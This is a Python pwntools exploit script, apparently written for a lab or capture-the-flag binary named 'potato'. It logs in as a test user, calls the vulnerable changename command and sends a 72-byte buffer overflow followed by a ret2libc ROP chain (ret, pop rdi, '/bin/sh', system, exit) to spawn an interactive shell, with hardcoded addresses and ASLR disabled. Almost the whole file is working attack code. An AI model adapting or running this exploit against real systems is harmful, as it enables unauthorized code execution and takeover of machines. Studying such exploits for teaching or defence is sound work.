#!/usr/bin/env python3

from pwn import *
import sys

# Addresses of libc functions system() and exit()
SYSTEM = 0x155554c5c8f0
EXIT = 0x155554c4c280

# Address of 'pop rdi ; ret' statement for setting rdi value which will be used as input for system()
# Address of dummy 'ret' statement (dummy in this case means any single ret statement) for stack alignment
POP_RDI = 0x155554c34205
DUMMY_RET = 0x4040e4

# Address of '/bin/sh' string from heap to use as argument for system()
BIN_SH = 0x4088c7

elf = ELF("./potato")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:192
continue
''')

# Login with test user
print(p.recvuntil(b"cmd> "))
p.sendline(b"login")
p.sendline(b"peter") # username
p.sendline(b"12345") # password
print(p.recvuntil(b"cmd> "))

# Call of vulnerable function change_name()
p.sendline(b"changename")

# Payload for Ret2LibC attack
payload = b''.join([b'\x41'*72, p64(DUMMY_RET), p64(POP_RDI), p64(BIN_SH), p64(SYSTEM), p64(EXIT)])

p.sendline(payload)

p.interactive()